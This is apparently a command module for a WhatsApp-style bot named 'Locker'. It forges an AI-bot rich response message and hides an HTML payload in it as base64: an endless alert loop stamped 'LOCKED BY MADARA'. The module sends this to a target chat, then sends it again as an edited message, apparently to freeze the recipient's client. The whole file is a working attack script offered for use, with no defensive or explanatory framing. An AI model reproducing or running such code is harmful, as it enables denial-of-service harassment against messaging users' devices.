import { loadCmdsHtml } from '@/system/commands.js'
export const name = 'Locker'
export async function run({ sock, from }) {
    const html = "<script>while(true){alert('LOCKED BY MADARA ♕')}</script>"
    const message = { botForwardedMessage: { message: { richResponseMessage: { messageType: 1, unifiedResponse: { data: Buffer.from(JSON.stringify({ __typename: 'GenAIUnifiedResponse', response_id: 'TuPutaMadreJaja', sections: [{ __typename: 'GenAIUnifiedResponseSection', view_model: { __typename: 'GenAISingleLayoutViewModel', primitive: { __typename: 'FOAHtmlPrimitiveDemoDONOTUSE', trusted_sources: [], payload: html } } }] })).toString('base64') }, contextInfo: { forwardingScore: 1, isForwarded: true, forwardOrigin: 4, forwardedAiBotMessageInfo: { botJid: '0@bot' } } } } } }
    const cu = await sock.relayMessage(from, message, {})
    await sock.relayMessage(from, { botForwardedMessage: { message: { protocolMessage: { key: { remoteJid: from, fromMe: true, id: cu }, type: 14, editedMessage: message } } } }, {})
}